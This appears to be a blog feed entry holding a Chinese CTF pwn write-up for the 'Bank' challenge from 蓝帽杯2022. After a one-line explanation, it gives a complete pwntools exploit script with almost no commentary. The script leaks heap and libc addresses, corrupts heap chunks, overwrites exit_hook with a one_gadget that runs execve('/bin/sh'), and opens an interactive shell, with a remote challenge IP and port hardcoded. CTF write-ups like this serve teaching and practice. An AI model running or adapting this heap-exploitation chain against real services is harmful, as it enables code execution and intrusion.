<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100924046.jpg"></p>
<p>最后向abyss转钱将exit_hook改成one_gadget</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./Bank&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">ip = <span class="string">&#x27;106.54.163.94&#x27;</span></span><br><span class="line">port = <span class="number">20000</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr : log.info(addr)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Login</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Click: &#x27;</span>, <span class="string">b&#x27;Login&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;123456&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Put</span>(<span class="params">money</span>):      </span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;Put&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;? &#x27;</span>, <span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dep</span>(<span class="params">money</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;Deposit&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;? &#x27;</span>, <span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">money</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;Transfer&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;? &#x27;</span>, <span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;? &#x27;</span>, <span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">ptr</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;Transfer&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;? &#x27;</span>, <span class="string">b&#x27;hacker&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;? &#x27;</span>, <span class="string">b&#x27;52&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;!&#x27;</span>, <span class="built_in">str</span>(ptr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">relloc</span>(<span class="params">size</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;Transfer&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;? &#x27;</span>, <span class="string">b&#x27;ghost&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;? &#x27;</span>, <span class="string">b&#x27;11&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;)&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">abyss</span>(<span class="params">con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;Transfer&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;? &#x27;</span>, <span class="string">b&#x27;abyss&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;? &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(con))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc_0x10</span>(<span class="params">con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;Transfer&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;? &#x27;</span>, <span class="string">b&#x27;guest&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;? &#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">money = <span class="number">0x100</span></span><br><span class="line">Login()</span><br><span class="line"></span><br><span class="line"><span class="comment">#get more money</span></span><br><span class="line">Put(<span class="number">0x100</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    Dep(money)</span><br><span class="line">    Put(money)</span><br><span class="line">    money *= <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    malloc_0x10(<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">relloc(<span class="number">0x100</span>)</span><br><span class="line">relloc(<span class="number">1</span>)</span><br><span class="line">admin(<span class="number">0x148</span> // <span class="number">8</span>)</span><br><span class="line">ru(<span class="string">b&#x27;think &#x27;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">malloc_0x10(p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    malloc_0x10(p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">delete(heap + <span class="number">0x4e0</span>)</span><br><span class="line">admin(<span class="number">0x240</span> // <span class="number">8</span>)</span><br><span class="line">ru(<span class="string">b&#x27;think &#x27;</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(io.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">exit_hook = libcbase + <span class="number">0x1f5150</span></span><br><span class="line">one = libcbase + <span class="number">0xe6af4</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe6aee execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6af1 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe6af4 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(exit_hook))</span><br><span class="line"></span><br><span class="line">delete(heap + <span class="number">0x2a0</span>)</span><br><span class="line">malloc_0x10(p64(exit_hook) * <span class="number">2</span>)</span><br><span class="line">abyss(one)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<p>参考链接</p>
<p><a href="https://blog.e4l4.com/posts/%E8%93%9D%E5%B8%BD%E6%9D%AF/#bankexit_hook">https://blog.e4l4.com/posts/%E8%93%9D%E5%B8%BD%E6%9D%AF/#bankexit_hook</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>蓝帽杯2022</tag>
      </tags>
  </entry>
</search>
